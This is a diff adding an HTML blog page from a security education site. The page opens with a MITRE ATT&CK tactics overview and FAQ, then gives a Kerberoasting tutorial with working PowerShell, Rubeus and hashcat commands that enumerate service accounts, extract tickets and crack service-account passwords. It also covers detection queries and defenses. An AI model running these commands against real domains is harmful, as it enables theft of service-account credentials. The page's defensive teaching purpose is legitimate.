@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MITRE ATT&CK Tactics</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body class="blog-layout">
+
+  <!-- Navbar -->
+  <header class="navbar">
+    <div class="navbar__brand">
+      <div class="helix-icon">HK</div>
+      Helix Kitten Security
+    </div>
+    <div class="navbar__search">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color:var(--text-muted)"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+      <input type="text" placeholder="Search documentation...">
+      <kbd>/</kbd>
+    </div>
+    <nav class="navbar__links">
+      <a href="index.html">Home</a>
+      <a href="#" class="active">Blog</a>
+      <a href="#">About</a>
+      <a href="#">Contact</a>
+    </nav>
+  </header>
+
+  <div class="blog-container">
+    <!-- Main Article -->
+    <article class="blog-main">
+      <div class="blog-header">
+        <a href="index.html" class="blog-header__back">&#8592; Back to Documentation</a>
+        <h1 class="blog-header__title">Kerberoasting: Active Directory Attack Technique</h1>
+        <div class="blog-header__meta">
+          <span>&#128100; mindhackdiva</span>
+          <span>&#128197; March 21, 2026</span>
+          <span>&#9201; 12 min read</span>
+        </div>
+        <div class="blog-header__tags">
+          <span class="blog-tag">MITRE ATT&CK Tactics</span>
+          <span class="blog-tag">Cyber Defense</span>
+          <span class="blog-tag">Tactics, Techniques, Procedures (TTPs)</span>
+          <span class="blog-tag">Blue Team</span>
+        </div>
+      </div>
+
+ <!-- Card Grid -->
+      <section id="topics" class="fade-up">
+        <h2 class="section-heading">Explore the 14 MITRE ATT&CK Tactics</h2>
+        <p class="section-sub">Each tactic represents a phase of a cyberattack - from initial reconnaisssance to final impact. Click any tactic to learn about its associated techniques with detection and mitigation recommendations and guidance..</p>
+        <div class="card-grid">
+          <div class="card">
+            <span class="card__icon">&#x1f3f0;</span>
+            <h3 class="card__title">TA0043 - Reconnaissance (45 Techniques)</h3>
+            <p class="card__desc">Gathering information to plan for future attacks through the use of Open-Source Intelligence (OSINT), scanning, enumeration, and phishing for targeted information.</p>
+            <a href="blog-kerberoasting.html" class="card__link">Explore &#8594;</a>
+          </div>
+          <div class="card">
+            <span class="card__icon">&#x1f527;</span>
+            <h3 class="card__title">TA0042 - Resource Development (47 Techniques)</h3>
+            <p class="card__desc">Establishing resources to support operations including infrastructure, accounts, and various network capabilities.</p>
+            <a href="blog-nmap.html" class="card__link">Explore &#8594;</a>
+          </div>
+          <div class="card">
+            <span class="card__icon">&#x1f6e1;</span>
+            <h3 class="card__title">TA0001 - Initial Access (22 Techniques)</h3>
+            <p class="card__desc">Gaining entry through phishing, exploiting public-facing applications and supply chain attacks and compromise.</p>
+            <a href="blog-kerberoasting.html" class="card__link">Explore &#8594;</a>
+          </div>
+          <div class="card">
+            <span class="card__icon">&#x1f4cb;</span>
+            <h3 class="card__title">TA0002 - Execution (46 Techniques)</h3>
+            <p class="card__desc">Running malicious code via command-line interpreters, scripting engines, and exploitation for client/agent execution.</p>
+            <a href="blog-kerberoasting.html" class="card__link">Explore &#8594;</a>
+          </div>
+          <div class="card">
+            <span class="card__icon">&#x1f310;</span>
+            <h3 class="card__title">TA0003 - Persistence (126 Techniques)</h3>
+            <p class="card__desc">Maintaining access across server restarts and credential changes via boot scripts, scheduled tasks, and account manipulation.</p>
+            <a href="blog-kerberoasting.html" class="card__link">Explore &#8594;</a>
+          </div>
+  <div class="card">
+            <span class="card__icon">&#x1f310;</span>
+            <h3 class="card__title">TA0004 - Privilege Escalation (109 Techniques)</h3>
+            <p class="card__desc">Gaining higher-level permissions trough process injection, valid account abuse, and vulnerability exploitation.</p>
+            <a href="blog-kerberoasting.html" class="card__link">Explore &#8594;</a>
+          </div>
+  <div class="card">
+            <span class="card__icon">&#x1f310;</span>
+            <h3 class="card__title">TA0005 - Defense Evasion (215 Techniques)</h3>
+            <p class="card__desc">Avoiding detection - the largest tactic - covering obfuscation, masquerading, process injection, and indicator removal.</p>
+            <a href="blog-kerberoasting.html" class="card__link">Explore &#8594;</a>
+          </div>
+  <div class="card">
+            <span class="card__icon">&#x1f310;</span>
+            <h3 class="card__title">TA0006 - Credential Access (67 Techniques)</h3>
+            <p class="card__desc">Stealing account credentials through OS credential dumping, brute-force, input capture, and credential harvesting.</p>
+            <a href="blog-kerberoasting.html" class="card__link">Explore &#8594;</a>
+          </div>
+  <div class="card">
+            <span class="card__icon">&#x1f310;</span>
+            <h3 class="card__title">TA0007 - Discovery (49 Techniques)</h3>
+            <p class="card__desc">Mapping the targeted environment by discovering and enumerating accounts, network configurations, system information, and security software exploitation.</p>
+            <a href="blog-kerberoasting.html" class="card__link">Explore &#8594;</a>
+          </div>
+  <div class="card">
+            <span class="card__icon">&#x1f310;</span>
+            <h3 class="card__title">TA0008 - Lateral Movement (23 Techniques)</h3>
+            <p class="card__desc">Moving through the network using remote access tools and services, exploitation, and tainted shared content.</p>
+            <a href="blog-kerberoasting.html" class="card__link">Explore &#8594;</a>
+          </div>
+  <div class="card">
+            <span class="card__icon">&#x1f310;</span>
+            <h3 class="card__title">TA0009 - Collection (41 Techniques)</h3>
+            <p class="card__desc">Gathering data of interest from local systems, network shares, emails, browsers, screen captures, and clipboard information.</p>
+            <a href="blog-kerberoasting.html" class="card__link">Explore &#8594;</a>
+          </div>
+  <div class="card">
+            <span class="card__icon">&#x1f310;</span>
+            <h3 class="card__title">TA0010 - Exfiltration (19 Techniques)</h3>
+            <p class="card__desc">Stealing data from the network via C2 channels, alternative network protocols, cloud storage, and physical media.</p>
+            <a href="blog-kerberoasting.html" class="card__link">Explore &#8594;</a>
+          </div>
+  <div class="card">
+            <span class="card__icon">&#x1f310;</span>
+            <h3 class="card__title">TA0011 - Command and Control (C2) (45 Techniques)</h3>
+            <p class="card__desc">Communicating with compromised systems using web protocols, DNS, proxies, and encrypted and obfuscated (hidden or covert) channels. </p>
+            <a href="blog-kerberoasting.html" class="card__link">Explore &#8594;</a>
+          </div>
+  <div class="card">
+            <span class="card__icon">&#x1f310;</span>
+            <h3 class="card__title">TA0040- Impact (33 Techniques)</h3>
+            <p class="card__desc">Disrupting availability and integrity through the use of data destruction, ransomware, encryption, defacement, and resource hijacking.</p>
+            <a href="blog-kerberoasting.html" class="card__link">Explore &#8594;</a>
+          </div>
+        </div>
+      </section>
+
+      <div class="blog-content">
+        <h2 id="overview">Frequently Asked Questions</h2>
+        <p><b>What is the MITRE ATT&CK Framework?</b></p>
+<p>MITRE ATT&CK is a globally accessible knowledge base of adversary Tactics, Techniques, and Procedures (TTPs) based and documented on real-world observations. It helps security teams better understand how attackers think, move, operate to aid in building better and more resilient network perimeter defenses.</p>
+<p><b>How many techniques are in MITRE ATT&CK Enterprise?</b></p>
+<p>The Enterprise ATT&CK matrix contains 14 tactics, 216 techniques, and 475 sub-techniques - over 690 distinct attack methods documented by MITRE.</p>
+<p><b>Who should use the MITRE ATT&CK framework?</b></p>
+<p>Security analysts, IT managers, SOC teams, and startup founders who need to understand adversary behavior without deep technical jargon. Each page is written at a beginner-friendly level.</p>
+<p><b>What is the difference between a tactic and a technique?</b></p>
+<p>A tactic is the adversary's goal (e.g., gaining initial access). A technique is a specific method used to achieve that goal (e.g., phishing). Sub-techniques provide even more granular details.</p>
+<p><b>How can MITRE ATT&CK protect my startup?</b></p>
+<p>The MITRE ATT&CK framework can help you to better prioritize your defenses by showing you which attack techniques are the most common. You can then use this guidance to map your security controls against the framework to identify gaps in detection, and allocated your resources in a more efficient and effective manner.</p>
+
+
+
+        <div class="callout callout--info">
+          <span class="callout__icon">&#x2139;&#xFE0F;</span>
+          <div>Kerberoasting requires only a valid domain user account — no elevated privileges are needed to request service tickets, making it a low-barrier, high-impact attack.</div>
+        </div>
+
+        <h2 id="how-it-works">How Kerberoasting Works</h2>
+        <p>The Kerberos authentication protocol uses service tickets encrypted with the NTLM hash of the service account password. The attack exploits this design:</p>
+        <ol>
+          <li><strong>Authenticate</strong> to the domain with any valid user credentials</li>
+          <li><strong>Query Active Directory</strong> for accounts with SPNs registered (using LDAP queries)</li>
+          <li><strong>Request TGS tickets</strong> for discovered SPNs from the Key Distribution Center (KDC)</li>
+          <li><strong>Extract the encrypted ticket data</strong> which contains the service account's password hash</li>
+          <li><strong>Crack offline</strong> using tools like Hashcat or John the Ripper against the RC4/AES encrypted ticket</li>
+        </ol>
+        <p>Because the TGS request is a normal Kerberos operation, it generates minimal suspicious activity in default Windows event logging configurations.</p>
+
+        <h2 id="prerequisites">Prerequisites</h2>
+        <ul>
+          <li>Valid domain user credentials (any authenticated user)</li>
+          <li>Network access to a Domain Controller (TCP port 88 for Kerberos)</li>
+          <li>Target accounts must have SPNs registered (service accounts, SQL servers, IIS app pools)</li>
+          <li>Weak or guessable passwords on service accounts (for successful cracking)</li>
+        </ul>
+
+        <h2 id="attack-steps">Step-by-Step Attack</h2>
+        <h3>Enumerate SPNs with PowerShell</h3>
+        <p>Use native Active Directory PowerShell modules to discover accounts with SPNs:</p>
+        <div class="code-block">
+          <div class="code-block__header">
+            <div class="code-block__dots"><span></span><span></span><span></span></div>
+            <span class="code-block__lang">powershell</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+<pre><span class="c-comment"># Enumerate all user accounts with SPNs</span>
+<span class="c-cmd">Get-ADUser</span> <span class="c-flag">-Filter</span> <span class="c-string">{ServicePrincipalName -ne "$null"}</span> <span class="c-flag">-Properties</span> ServicePrincipalName |
+  <span class="c-cmd">Select-Object</span> Name, SamAccountName, ServicePrincipalName
+
+<span class="c-comment"># Alternative: setspn.exe (built-in Windows tool)</span>
+<span class="c-cmd">setspn</span> <span class="c-flag">-T</span> <span class="c-string">corp.local</span> <span class="c-flag">-Q</span> <span class="c-string">*/*</span></pre>
+        </div>
+
+        <h3>Extract Tickets with Rubeus</h3>
+        <p>Rubeus is a C# toolset for Kerberos interaction and abuse. It can request and extract service tickets in a crackable format:</p>
+        <div class="code-block">
+          <div class="code-block__header">
+            <div class="code-block__dots"><span></span><span></span><span></span></div>
+            <span class="code-block__lang">cmd</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+<pre><span class="c-comment"># Request tickets for all kerberoastable accounts</span>
+<span class="c-cmd">Rubeus.exe</span> <span class="c-flag">kerberoast</span> <span class="c-flag">/outfile:</span><span class="c-string">hashes.txt</span>
+
+<span class="c-comment"># Target a specific SPN</span>
+<span class="c-cmd">Rubeus.exe</span> <span class="c-flag">kerberoast</span> <span class="c-flag">/spn:</span><span class="c-string">MSSQLSvc/db01.corp.local:1433</span>
+
+<span class="c-comment"># Use RC4 downgrade for easier cracking (noisier)</span>
+<span class="c-cmd">Rubeus.exe</span> <span class="c-flag">kerberoast</span> <span class="c-flag">/tgtdeleg</span></pre>
+        </div>
+
+        <h3>Crack with Hashcat</h3>
+        <div class="code-block">
+          <div class="code-block__header">
+            <div class="code-block__dots"><span></span><span></span><span></span></div>
+            <span class="code-block__lang">bash</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+<pre><span class="c-comment"># Crack Kerberos 5 TGS-REP (RC4 - type 23)</span>
+<span class="c-cmd">hashcat</span> <span class="c-flag">-m 13100</span> hashes.txt <span class="c-string">wordlist.txt</span> <span class="c-flag">-r rules/best64.rule</span>
+
+<span class="c-comment"># Crack AES256 tickets (type 17/18 — slower)</span>
+<span class="c-cmd">hashcat</span> <span class="c-flag">-m 19700</span> hashes.txt <span class="c-string">wordlist.txt</span> <span class="c-flag">--force</span>
+
+<span class="c-comment"># Check results</span>
+<span class="c-cmd">hashcat</span> <span class="c-flag">-m 13100</span> hashes.txt <span class="c-flag">--show</span>
+<span class="c-output">$krb5tgs$23$*svc_sql$CORP.LOCAL*$...:Summer2024!</span></pre>
+        </div>
+
+        <div class="callout callout--danger">
+          <span class="callout__icon">&#x26A0;&#xFE0F;</span>
+          <div><strong>Legal Notice:</strong> Only perform Kerberoasting attacks against systems you are authorized to test. Unauthorized access to computer systems is a criminal offense under laws such as the CFAA (US) and Computer Misuse Act (UK).</div>
+        </div>
+
+        <h2 id="detection">Detection &amp; Defense</h2>
+        <p>Defending against Kerberoasting requires a multi-layered approach combining preventive controls and detection mechanisms:</p>
+
+        <h3>Preventive Controls</h3>
+        <ul>
+          <li><strong>Strong service account passwords:</strong> Use 25+ character randomly generated passwords for all service accounts with SPNs</li>
+          <li><strong>Group Managed Service Accounts (gMSA):</strong> Automatically rotate 240-character complex passwords every 30 days</li>
+          <li><strong>AES encryption only:</strong> Disable RC4_HMAC_MD5 via GPO to force AES256, making cracking computationally expensive</li>
+          <li><strong>Minimize SPNs:</strong> Audit and remove unnecessary SPNs from user accounts; use computer accounts where possible</li>
+          <li><strong>Privileged Access Management:</strong> Avoid assigning Domain Admin or high-privilege group memberships to service accounts</li>
+        </ul>
+
+        <h3>Detection Methods</h3>
+        <ul>
+          <li><strong>Windows Event ID 4769:</strong> Monitor for TGS requests with RC4 encryption (Ticket Encryption Type 0x17)</li>
+          <li><strong>Anomaly detection:</strong> Alert on users requesting TGS tickets for an abnormal number of services</li>
+          <li><strong>Honey SPNs:</strong> Create decoy service accounts with SPNs as tripwires — any TGS request triggers an alert</li>
+          <li><strong>Sigma rules:</strong> Deploy community detection rules for Kerberoasting activity patterns</li>
+        </ul>
+
+        <div class="code-block">
+          <div class="code-block__header">
+            <div class="code-block__dots"><span></span><span></span><span></span></div>
+            <span class="code-block__lang">KQL (Microsoft Sentinel)</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+<pre><span class="c-comment">// Detect potential Kerberoasting via RC4 TGS requests</span>
+<span class="c-cmd">SecurityEvent</span>
+| <span class="c-keyword">where</span> EventID == <span class="c-string">4769</span>
+| <span class="c-keyword">where</span> TicketEncryptionType == <span class="c-string">"0x17"</span>   <span class="c-comment">// RC4</span>
+| <span class="c-keyword">where</span> ServiceName !endswith <span class="c-string">"$"</span>         <span class="c-comment">// Exclude machine accounts</span>
+| <span class="c-keyword">summarize</span> Count=<span class="c-cmd">count</span>() <span class="c-keyword">by</span> TargetUserName, IpAddress, <span class="c-cmd">bin</span>(TimeGenerated, <span class="c-string">5m</span>)
+| <span class="c-keyword">where</span> Count > <span class="c-string">5</span></pre>
+        </div>
+
+        <h2 id="tools">Tools Used</h2>
+        <ul>
+          <li><strong>Rubeus</strong> — C# Kerberos abuse toolkit (GhostPack)</li>
+          <li><strong>Impacket (GetUserSPNs.py)</strong> — Python-based Kerberoasting from Linux</li>
+          <li><strong>PowerView (Get-DomainSPNTicket)</strong> — PowerShell SPN enumeration</li>
+          <li><strong>Hashcat</strong> — GPU-accelerated password cracking</li>
+          <li><strong>John the Ripper</strong> — CPU-based hash cracking with krb5tgs module</li>
+          <li><strong>BloodHound</strong> — AD attack path visualization and Kerberoastable user identification</li>
+        </ul>
+
+        <h2 id="references">References</h2>
+        <ul>
+          <li>MITRE ATT&CK T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting</li>
+          <li>Tim Medin — "Attacking Microsoft Kerberos: Kicking the Guard Dog of Hades" (DerbyCon 2014)</li>
+          <li>Sean Metcalf — ADSecurity.org Kerberoasting guide</li>
+          <li>SpecterOps — "Roasting AS-REPs" and "Targeted Kerberoasting"</li>
+          <li>Microsoft — "Detecting Kerberoasting Activity" security guidance</li>
+        </ul>
+      </div>
+    </article>
+
+    <!-- Right TOC -->
+    <aside class="toc-sidebar">
+      <nav class="toc">
+        <div class="toc__title">On this page</div>
+        <a href="#overview" class="active">Overview</a>
+        <a href="#how-it-works">How Kerberoasting Works</a>
+        <a href="#prerequisites">Prerequisites</a>
+        <a href="#attack-steps">Step-by-Step Attack</a>
+        <a href="#detection">Detection &amp; Defense</a>
+        <a href="#tools">Tools Used</a>
+        <a href="#references">References</a>
+      </nav>
+    </aside>
+  </div>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer__inner">
+    <center>
+    <img src="https://pixelsafari.neocities.org/dividers/rainbowstars4.gif" alt="">
+    <img src="https://pixelsafari.neocities.org/dividers/rainbowstars4.gif" alt="">
+    </center>
+    <div class="footer__left">&copy;© 1996–2026 <strong>hackherway cybersecurity</strong>. Educational content only · No warranties implied</div>
+    <p class="footer-text">Built with curiosity, caffeine, and controlled paranoia</p>
+    <div class="footer__links">
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">GitHub</a>
+    <a href="#">Contact</a>
+    <center>   · · ·
+    <div class="footer__center">&copy;· Stay Safe · Stay Vigilant · Stay Informed · Educational content only · No warranties implied ·</div>
+    <p>made with ❤️ by nullbrat • mindhackdiva</p>
+    <p> · s08 🩷 a02 · b10 💙 j25 · k08 💚 d14 · </p>
+    <center><img src="https://pixelsafari.neocities.org/dividers/rainbowstars4.gif" alt="">
+    <img src="https://pixelsafari.neocities.org/dividers/rainbowstars4.gif" alt="">
+    </center>
+    </div>
+    </div>
+    </footer>
+
+
+  <script src="script.js"></script>
+</body>
+</html>
